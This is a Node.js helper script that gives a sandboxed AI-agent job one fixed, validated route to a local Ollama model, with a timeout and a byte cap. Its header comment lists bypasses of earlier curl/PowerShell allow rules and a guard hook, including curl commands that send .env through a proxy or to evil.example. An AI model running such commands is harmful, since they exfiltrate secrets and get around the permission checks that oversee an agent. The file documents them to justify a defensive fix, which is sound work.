#!/usr/bin/env node
/**
 * ollama-generate.mjs -- the only way a safe-mode claude-async job calls the resident Ollama model
 * (CLAUDE.md's "local model delegation (Ollama)" section), replacing the raw curl/Invoke-RestMethod/
 * Invoke-WebRequest allow rules job-core.mjs used to grant for exactly this purpose (2026-11-13
 * review round, fix 2).
 *
 * Why those raw rules had to go: a prefix match on argv TEXT cannot express "exactly this one URL
 * and nothing else appended". Demonstrated against the OLD rules (and against
 * hooks/ollama-guard-hook.mjs, which was meant to close exactly this gap and didn't catch all of
 * these):
 *   curl http://127.0.0.1:11434/api/generate -o file                 writes an arbitrary file
 *   curl ... --proxy host --data-binary @.env                       exfiltrates a file through a proxy
 *   curl http://127.0.0.1:11434/api/generate http://evil.example/... fetches a second URL
 *   Invoke-WebRequest ... -OutFile file                              writes an arbitrary file
 *   Invoke-RestMethod ... -InFile .env                               uploads an arbitrary file as the body
 *
 * This script instead takes ONLY --model/--prompt/--system/--format as named arguments (no file
 * input, no file output, no proxy, no custom URL, no redirect-following), POSTs to a FIXED
 * destination (127.0.0.1:11434/api/generate, connecting to the literal IP, never a hostname lookup)
 * using node:http directly (which never consults HTTP_PROXY/HTTPS_PROXY on its own), and prints the
 * response body to stdout. An absolute deadline and a byte cap bound the request regardless of what
 * the server does.
 *
 * Usage: node ollama-generate.mjs --model <name> --prompt <text> [--system <text>] [--format <value>]
 */
import http from "node:http";
import path from "node:path";
import { fileURLToPath } from "node:url";

export const HOST = "127.0.0.1";
export const PORT = 11434;
export const PATH_ = "/api/generate";
export const DEADLINE_MS = 60_000;
export const BODY_MAX_BYTES = 512 * 1024;
export const EXIT = Object.freeze({ OK: 0, USAGE: 2, REFUSED: 10, TRANSPORT_FAILED: 20, DEADLINE_EXCEEDED: 21 });

// Ollama model names look like "qwen2.5-coder:7b" / "llama3.1:8b-instruct-q4_0" -- letters, digits,
// and a small set of separators, bounded in length. Never passed through unvalidated: this is the
// one field that becomes part of the fixed request's JSON body, not the URL, but a malformed value
// here would otherwise be indistinguishable from an attempt to probe the field's handling.
const MODEL_RE = /^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$/;

const FLAGS = new Set(["--model", "--prompt", "--system", "--format"]);

export function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    const flag = argv[i];
    if (!FLAGS.has(flag)) return { error: `unrecognized argument ${JSON.stringify(flag)} (allowed: ${[...FLAGS].join(", ")})` };
    const value = argv[i + 1];
    if (value === undefined) return { error: `${flag} requires a value` };
    out[flag.slice(2)] = value;
    i++;
  }
  if (!out.model) return { error: "--model is required" };
  if (!out.prompt) return { error: "--prompt is required" };
  if (!MODEL_RE.test(out.model)) return { error: `--model ${JSON.stringify(out.model)} does not look like a valid model name` };
  return { args: out };
}

// doRequest: connects to the LITERAL host/port (HOST/PORT above by default -- never resolved from
// a caller-supplied value or an environment variable; the {host,port,path} override exists ONLY so
// this script's own tests can point it at a local ephemeral-port test server instead of the real
// Ollama daemon, a function-parameter seam a job can never reach). Never follows a redirect (the
// http module never auto-follows; we just report whatever comes back), and aborts the response the
// instant BODY_MAX_BYTES is exceeded rather than merely discarding the overflow while letting the
// server keep streaming.
function doRequest(body, deadlineMs, { host = HOST, port = PORT, path: reqPath = PATH_ } = {}) {
  return new Promise((resolve, reject) => {
    const payload = Buffer.from(body, "utf8");
    // Settle the promise the instant the byte cap is hit, synchronously, inside the 'data' handler
    // itself -- then destroy the socket purely to stop the server sending more. Waiting for
    // destroy()'s own 'error'/'close' event to resolve is unreliable: destroy() with no error arg
    // does not reliably emit 'error' at all (confirmed empirically: the request just hung to the
    // deadline instead), and destroying `res` can also surface an 'error' on `req` itself racing
    // req's own unconditional reject() below.
    let settled = false;
    const settle = (fn) => { if (!settled) { settled = true; fn(); } };
    const chunks = [];
    let total = 0;
    const req = http.request({
      host, port, path: reqPath, method: "POST",
      headers: { "content-type": "application/json", "content-length": payload.length },
      timeout: deadlineMs,
    }, (res) => {
      res.on("data", (c) => {
        if (total >= BODY_MAX_BYTES) return;
        const take = c.subarray(0, BODY_MAX_BYTES - total);
        chunks.push(take);
        total += take.length;
        if (total >= BODY_MAX_BYTES) {
          settle(() => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8"), truncated: true }));
          res.destroy();
        }
      });
      res.on("end", () => settle(() => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8") })));
      res.on("error", () => { /* only reachable after a deliberate destroy() above; already settled */ });
    });
    req.on("timeout", () => req.destroy(new Error(`request timed out after ${deadlineMs}ms`)));
    req.on("error", (e) => settle(() => reject(e)));
    req.write(payload);
    req.end();
  });
}

export async function generate(args, { deadlineMs = DEADLINE_MS, host, port, path: reqPath } = {}) {
  const parsed = parseArgs(Array.isArray(args) ? args : []);
  if (parsed.error) return { ok: false, exitCode: EXIT.USAGE, error: parsed.error };
  const { model, prompt, system, format } = parsed.args;
  const body = JSON.stringify({ model, prompt, stream: false, ...(system ? { system } : {}), ...(format ? { format } : {}) });
  const deadline = Date.now() + deadlineMs;
  let timer;
  try {
    const result = await Promise.race([
      doRequest(body, deadlineMs, { host, port, path: reqPath }),
      new Promise((_, reject) => { timer = setTimeout(() => reject(new Error("deadline exceeded")), Math.max(0, deadline - Date.now())); }),
    ]);
    return { ok: true, exitCode: EXIT.OK, status: result.status, body: result.body, truncated: Boolean(result.truncated) };
  } catch (e) {
    const isDeadline = /deadline exceeded|timed out/i.test(e.message || "");
    return { ok: false, exitCode: isDeadline ? EXIT.DEADLINE_EXCEEDED : EXIT.TRANSPORT_FAILED, error: e.message };
  } finally {
    clearTimeout(timer); // never leave this timer armed once either side of the race has settled
  }
}

async function cliMain(argv) {
  const out = await generate(argv);
  if (!out.ok) {
    process.stderr.write(`ollama-generate.mjs: ${out.error}\n`);
    process.exitCode = out.exitCode;
    return;
  }
  process.stdout.write(out.body);
  if (!out.body.endsWith("\n")) process.stdout.write("\n");
  process.exitCode = EXIT.OK;
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  await cliMain(process.argv.slice(2));
}
